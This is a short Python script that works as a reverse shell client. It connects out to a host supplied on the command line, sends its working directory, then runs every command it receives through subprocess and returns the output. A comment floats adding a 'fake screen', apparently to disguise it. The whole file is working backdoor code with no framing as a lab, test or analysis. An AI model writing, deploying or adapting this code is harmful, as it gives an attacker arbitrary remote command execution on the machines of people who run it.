import os
import sys
import socket
import ipaddress
import requests
import urllib3
import subprocess
import argparse

from colorama import Fore, Style
from time import sleep

PARSER = argparse.ArgumentParser()

PARSER.add_argument('Host', type = str, metavar = 'H')

_ARGS = PARSER.parse_args()

HOST = _ARGS.Host
PORT = 2230
BUFF_SIZE = 1024 * 128

socket = socket.socket()

socket.connect((HOST, PORT))

# possible make like a fake screen or sum shit lmao
print(Fore.GREEN + Style.BRIGHT + f"Connected to {HOST}!")

currentwd = os.getcwd()
socket.send(currentwd.encode())

while True:
    COMMAND = socket.recv(BUFF_SIZE).decode()

    SL_COMMAND = COMMAND.split()

    if COMMAND.lower() == 'exit':
        break

    if SL_COMMAND[0] == 'cd':
        try:
            os.chdir(' '.join(SL_COMMAND[1:]))
        except FileNotFoundError as error:
            OUTPUT = str(error)

        else:
            OUTPUT = ''

    else:
        OUTPUT = subprocess.getoutput(COMMAND)

    currentwd = os.getcwd()

    MESSAGE = f'{OUTPUT} | {currentwd}'

    socket.send(MESSAGE.encode())

socket.close()